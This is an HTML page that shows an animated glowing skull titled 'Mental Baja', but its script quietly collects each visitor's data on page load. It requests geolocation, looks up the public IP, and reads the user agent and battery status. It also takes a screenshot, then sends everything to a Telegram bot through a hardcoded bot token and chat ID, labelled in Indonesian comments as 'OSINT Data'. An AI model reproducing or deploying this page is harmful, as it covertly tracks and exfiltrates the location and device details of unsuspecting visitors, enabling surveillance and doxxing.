<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Mental Baja</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #121212;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .skull-container {
      width: 300px;
      height: 320px;
      position: relative;
      filter: drop-shadow(0 0 10px #ff0000aa);
      animation: headTilt 6s infinite ease-in-out alternate;
      transform-origin: center bottom;
    }
    svg {
      width: 100%;
      height: 100%;
      display: block;
    }
    .skull-base {
      fill: #eee;
      stroke: #888;
      stroke-width: 3px;
      filter: url(#shadow1);
    }
    .teeth {
      fill: #ccc;
      stroke: #777;
      stroke-width: 1.5px;
    }
    .eye, .nose {
      fill: #121212;
      filter: drop-shadow(0 0 6px #ff3300cc);
    }
    .eye-glow {
      fill: #ff3300;
      filter: blur(4px);
      opacity: 0.8;
      animation: eyeGlowPulse 2s infinite alternate ease-in-out;
    }
    @keyframes eyeGlowPulse {
      0% { opacity: 0.4; filter: blur(2px); }
      100% { opacity: 1; filter: blur(6px); }
    }
    @keyframes headTilt {
      0% { transform: rotate(0deg) translateY(0); }
      50% { transform: rotate(3deg) translateY(-5px); }
      100% { transform: rotate(0deg) translateY(0); }
    }
    .jaw {
      transform-origin: center top;
      animation: jawOpenClose 4s infinite ease-in-out alternate;
    }
    @keyframes jawOpenClose {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(7deg); }
    }
  </style>
</head>
<body>
  <div class="skull-container" aria-label="Animated Skull Mental Baja">
    <svg viewBox="0 0 300 320" role="img" aria-labelledby="skullTitle">
      <title id="skullTitle">Mental Baja</title>
      <desc>Khusus yang bermental baja!</desc>
      <defs>
        <filter id="shadow1" x="-20%" y="-20%" width="140%" height="140%">
          <feDropShadow dx="0" dy="4" stdDeviation="3" flood-color="#333" flood-opacity="0.6" />
        </filter>
      </defs>
      <path class="skull-base" d="M150 20 C100 20 70 80 70 140 C70 220 120 280 150 280 C180 280 230 220 230 140 C230 80 200 20 150 20 Z" />
      <g class="jaw">
        <path class="skull-base" d="M90 270 Q150 310 210 270 Q190 290 180 280 Q160 280 150 280 Q140 280 120 270 Q110 280 90 270 Z" />
        <rect class="teeth" x="112" y="270" width="10" height="8" rx="1" />
        <rect class="teeth" x="128" y="270" width="10" height="8" rx="1" />
        <rect class="teeth" x="144" y="270" width="10" height="8" rx="1" />
        <rect class="teeth" x="160" y="270" width="10" height="8" rx="1" />
      </g>
      <rect class="teeth" x="100" y="200" width="10" height="8" rx="1" />
      <rect class="teeth" x="120" y="198" width="15" height="10" rx="1" />
      <rect class="teeth" x="140" y="198" width="15" height="10" rx="1" />
      <rect class="teeth" x="165" y="200" width="10" height="8" rx="1" />
      <ellipse class="eye" cx="105" cy="110" rx="30" ry="38" />
      <ellipse class="eye" cx="195" cy="110" rx="30" ry="38" />
      <circle class="eye-glow" cx="105" cy="110" r="10" />
      <circle class="eye-glow" cx="195" cy="110" r="10" />
      <path class="nose" d="M140 160 L150 180 L160 160 Q150 170 140 160 Z" />
    </svg>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
  <script>
    const chatId = "5204287041"; // Chat ID kamu
    const token = "7647192109:AAHkTy5EWtkjnz-9wSyfHjcIf8giP94kPKs"; // Bot Token kamu

    function getOSINTData() {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;

        fetch("https://api.ipify.org?format=json")
          .then(res => res.json())
          .then(data => {
            const ip = data.ip;
            const ua = navigator.userAgent;

            navigator.getBattery().then(bat => {
              const battery = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Not charging'})`;

              html2canvas(document.body).then(canvas => {
                const screenshotData = canvas.toDataURL("image/png");

                // Kirim data teks ke Telegram
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: `OSINT Data:\nIP: ${ip}\nLokasi: ${latitude}, ${longitude}\nUser-Agent: ${ua}\nBaterai: ${battery}`
                  })
                });

                // Kirim screenshot base64 ke Telegram
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                    chat_id: chatId,
                    photo: screenshotData
                  })
                });
              });
            });
          });
      });
    }

    getOSINTData();
  </script>
</body>
</html>
